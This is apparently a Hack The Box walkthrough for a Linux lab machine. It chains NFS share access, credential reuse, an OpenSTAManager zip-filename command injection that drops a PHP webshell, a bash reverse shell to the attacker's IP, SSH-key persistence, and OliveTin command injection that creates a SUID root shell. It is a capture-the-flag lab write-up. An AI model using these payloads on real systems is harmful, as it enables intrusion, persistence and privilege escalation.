# Hack The Box - Enigma Walkthrough

## Machine Information
| Field | Value |
|------|------|
| Name | DevHub |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| Release Date | 27th June, 2026 |

## Overview  
Enigma is a Linux machine that starts with an NFS share leaking onboarding documents, leading through credential reuse across a webmail portal and OpenSTAManager (CVE-2025-69212 RCE) to a low-privileged shell, and ends with a database-stored bcrypt hash cracked to pivot into a local user, ultimately escalating to root via a command injection in OliveTin (CVE-2026-27626).

### Skills / Techniques

NFS Enumeration & Mounting
Sensitive Document Extraction (PDF)
Credential / Password Reuse
IMAP/POP3 Mailbox Access
Virtual Host Discovery
CVE Research & Exploitation (OpenSTAManager RCE)
Web Shell Upload & Execution
Reverse Shell
Database Credential Discovery
Hash Identification & Cracking (bcrypt)
Lateral Movement
SSH Key Persistence
SSH Port Forwarding (Local Service Tunneling)
Local Service Discovery (OliveTin)
Command Injection
Privilege Escalation
Linux Post-Exploitation Enumeration

### Table of Contents

Reconnaissance
NFS Enumeration
Initial Access (Webmail & IMAP)
Web Application Exploitation (OpenSTAManager)
Foothold & Reverse Shell
Database Credential Harvesting
Lateral Movement to Local User
Persistence via SSH Key
Internal Service Discovery (SSH Tunneling)
Privilege Escalation (OliveTin Command Injection)
Root Access

## RECON  

```
nmap -sC -sV -p- -oN nmap_enigma.txt <IP ADDRESS>
```
Nmap 7.99 scan initiated Mon Jun 28 15:00:01 2026 as: /usr/lib/nmap/nmap -sC -sV -p- -oN nmap_enigma.txt <IP ADDRESS>  
Nmap scan report for <IP ADDRESS>  
Host is up (0.031s latency).  
Not shown: 65522 closed tcp ports (reset)  
PORT      STATE SERVICE  VERSION  
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)  
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)  
80/tcp    open  http     nginx 1.24.0 (Ubuntu)  
|_http-server-header: nginx/1.24.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://enigma.htb/  
110/tcp   open  pop3     Dovecot pop3d  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=enigma  
| Subject Alternative Name: DNS:enigma  
| Not valid before: 2026-02-18T20:33:33  
|_Not valid after:  2036-02-16T20:33:33  
|_pop3-capabilities: SASL STLS CAPA RESP-CODES PIPELINING TOP UIDL AUTH-RESP-CODE  
111/tcp   open  rpcbind  2-4 (RPC #100000)  
| rpcinfo:   
|   program version    port/proto  service  
|   100000  2,3,4        111/tcp   rpcbind  
|  [...]  
143/tcp   open  imap     Dovecot imapd (Ubuntu)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=enigma  
| Subject Alternative Name: DNS:enigma  
| Not valid before: 2026-02-18T20:33:33  
|_Not valid after:  2036-02-16T20:33:33  
|_imap-capabilities: OK LITERAL+ listed more ENABLE have LOGIN-REFERRALS LOGINDISABLEDA0001 IMAP4rev1 ID capabilities Pre-login IDLE SASL-IR post-login STARTTLS  
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)  
|_ssl-date: TLS randomness does not represent time  
|_imap-capabilities: OK LITERAL+ listed ENABLE more LOGIN-REFERRALS AUTH=PLAINA0001 IMAP4rev1 ID capabilities Pre-login IDLE SASL-IR have post-login  
| ssl-cert: Subject: commonName=enigma  
| Subject Alternative Name: DNS:enigma  
| Not valid before: 2026-02-18T20:33:33  
|_Not valid after:  2036-02-16T20:33:33  
995/tcp   open  ssl/pop3 Dovecot pop3d  
|_pop3-capabilities: SASL(PLAIN) USER CAPA RESP-CODES PIPELINING TOP UIDL AUTH-RESP-CODE  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=enigma  
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33  
|_Not valid after:  2036-02-16T20:33:33  
2049/tcp  open  nfs_acl  3 (RPC #100227)
39479/tcp open  status   1 (RPC #100024)  
40183/tcp open  nlockmgr 1-4 (RPC #100021)  
46981/tcp open  mountd   1-3 (RPC #100005)  
57219/tcp open  mountd   1-3 (RPC #100005)  
58783/tcp open  mountd   1-3 (RPC #100005)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

We add the machine's IP address to the /etc/hosts file so we can resolve the enigma.htb domain:
```
echo '<IP ADDRESS>    enigma.htb' | sudo tee -a /etc/hosts
```

The scan reveals a fairly large attack surface: SSH (22), HTTP (80), POP3/IMAP via Dovecot (110, 143, 993, 995), and a full NFS stack (111, 2049, plus the associated mountd, nlockmgr, and status RPC services on various high ports).  
Browsing to http://enigma.htb on port 80 just shows a static page with no interesting functionality, no obvious parameters, and no exposed endpoints worth digging into. After a quick look, this didn't lead anywhere, so we set it aside and shift our focus to NFS, which stands out given the number of exported services and ports tied to it.  

## NFS Enumeration  
We start by listing the available NFS exports on the target:  
```
showmount -e <IP ADDRESS> 
Export list for <IP ADDRESS>: 
/srv/nfs/onboarding *
```
The server exports a single share: /srv/nfs/onboarding. The * means it's accessible from any host that can reach the NFS service, with no IP-based restrictions, this typically means we can mount it directly from our Kali machine.  
The name onboarding is worth noting, as it suggests this directory might be used to provision new users or employees, which could mean it contains credentials, scripts, or configuration files relevant to gaining initial access.  
We mount the share locally to inspect its contents:  
```
mkdir -p /home/kali/Desktop/HTB/Enigma/enigma_nfs  
sudo mount -t nfs <IP ADDRESS>:/srv/nfs/onboarding /home/kali/Desktop/HTB/Enigma/enigma_nfs
```
## Exploring the NFS Share
Listing the contents of the mounted share:  
```
ls -la 
total 12
drwxr-xr-x 2 root root 4096 Feb 19 20:54 . 
drwxrwxr-x 3 kali kali 4096 Jun 28 17:11 .. 
-rw-r--r-- 1 root root 1751 Feb 19 20:53 New_Employee_Access.pdf
```
We find a single file, New_Employee_Access.pdf, which fits the "onboarding" theme and is likely to contain useful information for new employees — potentially credentials, instructions, or internal references.  
We extract its text content directly to stdout using pdftotext, with - as the output argument telling it to print the result straight to the terminal instead of writing it to a file:  
```
pdftotext /home/kali/Desktop/HTB/Enigma/enigma_nfs/New_Employee_Access.pdf -
Enigma Corp IT Department - New Employee System Access
Employee: Kevin Mitchell 
Department: Operations
Provisioned by: IT Department 
Date: 2024-03-01 
Webmail Access URL: http://mail001.enigma.htb 
Username: <redacted>
Password: <redacted>
Please change your password upon first login. 
For support contact: it@enigma.htb 
This document contains confidential internal information intended solely for the recipient. 
Unauthorized access, disclosure, or distribution is strictly prohibited. 
Generated automatically by Enigma Corp Identity Management System.
```
The document turns out to be an onboarding letter from Enigma Corp's IT department, containing webmail credentials for a new employee.  
This gives us a new virtual host, mail001.enigma.htb, along with a set of credentials for a webmail portal. We add the host entry so we can resolve it:  
```
echo '<IP ADDRESS>    mail001.enigma.htb' | sudo tee -a /etc/hosts
```
Logging into the webmail portal with the credentials, we find it's running an outdated version, but a quick look doesn't reveal any obvious exploitable vulnerability in the interface itself.    
Inside the inbox, there's a single email from sarah@enigma.htb. Since we already have valid credentials, it's worth checking whether the same password is reused for IMAP access:  
```
curl -ks --user 'sarah:<redacted>' 'imaps://<IP ADDRESS>/INBOX'
* LIST (\HasNoChildren) "/" INBOX
```
The login succeeds, confirming password reuse. Fetching the message via IMAP:  
```
curl -ks --user 'sarah:<redacted>' 'imaps://<IP ADDRESS>/INBOX;UID=*'
Return-Path: <it@enigma.htb>
X-Original-To: sarah@localhost
Delivered-To: sarah@localhost
Received: from enigma (localhost [127.0.0.1])
        by enigma (Postfix) with ESMTP id C123C211B9
        for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
Date: Thu, 19 Feb 2026 10:22:00 +0000
Subject: Re: OpenSTAManager Access Request
From: it@enigma.htb
To: sarah@enigma.htb
Message-Id: <osm-reply-001@enigma.htb>
In-Reply-To: <osm-request-001@enigma.htb>
References: <osm-request-001@enigma.htb>

Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the
details below:

URL: http://support_001.enigma.htb
Username: <redacted>
Password: <redacted>

Note: I will create a dedicated account for you shortly, for now you can
use the admin account to get started.

Regards,
IT Support
Enigma Corp
```
This reveals a third virtual host along with credentials for what appears to be an internal support application. We add the host entry:

### Identifying the Vulnerability  
Logging in with the leaked credentials, the application turns out to be OpenSTAManager v2.9.8, which is vulnerable to CVE-2025-69212, a known flaw allowing remote code execution via a crafted upload.  
``` echo '<IP ADDRESS>    support_001.enigma.htb' | sudo tee -a /etc/hosts ```

References:  
[NVD - CVE-2025-69212  ](https://nvd.nist.gov/vuln/detail/CVE-2025-69212)
[GitHub Advisory - GHSA-25fp-8w8p-mx36](https://github.com/advisories/GHSA-25fp-8w8p-mx36)  

### Building the Malicious Archive  
The vulnerability is triggered through a specially crafted .zip archive whose internal filename smuggles a shell command, which gets executed when the archive is processed by the application. We abuse this to drop a PHP webshell inside the application's files directory:  
```
python3 - <<'PY'
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
name = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('/tmp/exploit.zip', 'w') as z:
    z.writestr(name, b'DUMMY_P7M_CONTENT')

print('/tmp/exploit.zip created')
PY
```
The crafted entry name is structured to break out of the expected filename format, inject our echo command to write a PHP webshell (SHELL.php) into the files/ directory, and then close the string cleanly with .p7m so the application's filename parsing doesn't choke on it.  

### Uploading the Malicious Archive  
We upload the crafted archive either through the web interface or directly via curl, using a valid authenticated session cookie:  
```
curl -i -b 'PHPSESSID=<redacted>' \
  -F 'op=save' \
  -F 'id_module=14' \
  -F 'id_plugin=48' \
  -F 'blob1=@/tmp/exploit.zip;type=application/zip' \
  'http://support_001.enigma.htb/actions.php'
```
We test the webshell by executing a simple id command:   
```
curl -s 'http://support_001.enigma.htb/files/SHELL.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The webshell has been successfully written and we have remote code execution as www-data.  

### Catching a Reverse Shell  
We set up a listener on our attacking machine:  
``` nc -lvnp 4444 ```
Then trigger the webshell to send a reverse shell back to us:  
``` curl -G 'http://support_001.enigma.htb/files/SHELL.php' --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/<IP Address>/4444 0>&1"' ```
Once the connection lands, we upgrade to a fully interactive TTY:  
``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```

### Internal Service Enumeration
With a foothold on the box, we check for locally bound services that aren't exposed externally:  
```
ss -tulnp

Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                                     
tcp   LISTEN 0      100          0.0.0.0:995        0.0.0.0:*                                                           
tcp   LISTEN 0      100          0.0.0.0:993        0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:39479      0.0.0.0:*                                                           
tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*                                                           
tcp   LISTEN 0      100        127.0.0.1:25         0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:111        0.0.0.0:*                                                           
tcp   LISTEN 0      100          0.0.0.0:110        0.0.0.0:*                                                           
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1555,fd=5),("nginx",pid=1554,fd=5))
tcp   LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*                                                           
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                                           
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
tcp   LISTEN 0      100          0.0.0.0:143        0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:57219      0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:46981      0.0.0.0:*                                                           
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:58783      0.0.0.0:*                                                           
tcp   LISTEN 0      64           0.0.0.0:40183      0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*                                                           
```

### Loot: Database Credentials  
Inspecting the application's configuration file, /var/www/html/openstamanager/config.inc.php, we find hardcoded database credentials:  
```
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = '<redacted>';
$db_password = '<redacted>';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];
```
### Accessing the Database  
Using the database credentials recovered earlier from config.inc.php, we connect to the local MySQL instance:  
```
mysql -u <redacted> -p

mysql> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openstamanager      |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

```
We switch focus to the openstamanager database and list its tables:  
```
mysql> show tables;
show tables;

[...]
| zz_users                        |
[...]

mysql> select * from zz_users;
select * from zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
| id | username | password      | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
|  1 | admin    | <redacted>    | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | <redacted>    | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+---------+
```
### Identifying the Hash Format and Cracking tha Hash  
The zz_users table contains a bcrypt-style password hash. We confirm the hash type with hashid:  
```
hashid -m '$2y$10$<redacted>'
Analyzing '$2y$10$<redacted>'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x
[+] bcrypt [Hashcat Mode: 3200]
```
This confirms it's a bcrypt hash, crackable with Hashcat mode 3200.  
Running the hash through Hashcat against a wordlist (e.g. rockyou.txt), and then retrieving the cracked result:  
```
hashcat -m 3200 hash.txt --show
$2y$10$<redacted>:<redacted>
```
The crack succeeds, giving us a plaintext password.  
### Lateral Movement to a System User
Since the cracked hash belongs to a user named <redacted in the zz_users table, we try the cracked plaintext password against the corresponding local system account:  
```
su <redacted>
Password: <redacted>
```
The login succeeds, giving us a shell as the local user haris.   

### Establishing Persistent Access
To get a more stable foothold as <redacted> - and to enable VPN tunneling for accessing services bound to localhost (like the one we're about to find on port 1337) - we generate an SSH keypair on our attacking machine and drop the public key into the user's authorized_keys:  
```
Attacker Machine:
ssh-keygen -t ed25519 -f enigma -C <redacted>@enigma
cat enigma.pub
ssh-ed25519 <redacted> <redacted>@enigma
Target Machine:
echo 'ssh-ed25519 <MyPUBkey> <redacted>@enigma' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
```
This gives us SSH access as <redacted>, which we'll use to set up an SSH tunnel (-L) and forward the locally-bound port 1337 to our machine, letting us reach internal-only services from outside the box.  
### Investigating the Local-Only Port 1337  
Going back to the earlier ss -tulnp output, port 1337 was bound to 127.0.0.1 only. We tunnel it to our attacking machine via SSH, e.g.:  
``` 
ssh -i enigma -L 1337:127.0.0.1:1337 <redacted>@enigma.htb  
```
With the tunnel up, we can now reach it locally:  
```
curl -i http://localhost:1337/
[...]
<title>OliveTin</title>
[...]
v3000.10.0
[...]
```
The service turns out to be OliveTin version OliveTin 3000.10.0, a web UI for running predefined shell commands. We check what it's running as:  
```
ps aux | grep -i '[o]livetin'
root        1510  0.0  0.5 1240144 22000 ?       Ssl  11:43   0:00 /usr/local/bin/OliveTin
```
It's running as root, which makes it an attractive privilege escalation target if we can find a way to interact with or exploit it.  
### Searching for a Known Vulnerability  
We look for public advisories or CVEs affecting OliveTin:  

[GitHub Advisory - GHSA-49gm-hh7w-wfvf](https://github.com/advisories/GHSA-49gm-hh7w-wfvf)
[NVD - CVE-2026-27626](https://nvd.nist.gov/vuln/detail/CVE-2026-27626)

### Exploiting OliveTin (CVE-2026-27626)
We intercept traffic with Burp while interacting with the OliveTin web UI, and trigger the "backup database" predefined action. This reveals the underlying API call:  

```
POST /api/olivetin.api.v1.OliveTinApiService/StartAction HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 202
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
content-type: application/json
sec-ch-ua-mobile: ?0
connect-protocol-version: 1
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/actionBinding/backup_database/argumentForm
Accept-Encoding: gzip, deflate, br
Cookie: lang=en-US
Connection: keep-alive

{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"79432ab6-8454-447c-be62-12b0a068ca15"}
```

The vulnerable endpoint is /api/olivetin.api.v1.OliveTinApiService/StartAction, which takes a bindingId and a list of arguments that get passed into the underlying shell command without proper sanitization. The db_pass argument is unsanitized and gets concatenated directly into the shell command executed by the action, making it injectable.    

### Crafting the Exploit  
We inject a malicious payload into the db_pass parameter to break out of the intended command and execute our own, copying /bin/bash to /tmp/rootbash and setting the SUID bit on it:  
```
curl -s -X POST 'http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction' \
  -H 'content-type: application/json' \
  -H 'connect-protocol-version: 1' \
  --data '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x'\''; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #"},{"name":"db_name","value":"production"}],"uniqueTrackingId":"rootbash-008"}'
```
Since OliveTin runs as root, the injected command executes with root privileges, creating a SUID copy of bash:  
```
ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Jun 28 21:28 /tmp/rootbash
```
### Privilege Escalation to Root  
We execute the SUID bash binary with the -p flag to preserve privileges:  
```
/tmp/rootbash -p
rootbash-5.2# id
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
```
We now have an effective UID of 0 (root). Reading the root flag confirms full ownership of the box:  
rootbash-5.2# cat /root/root.txt  
<redacted>  

 











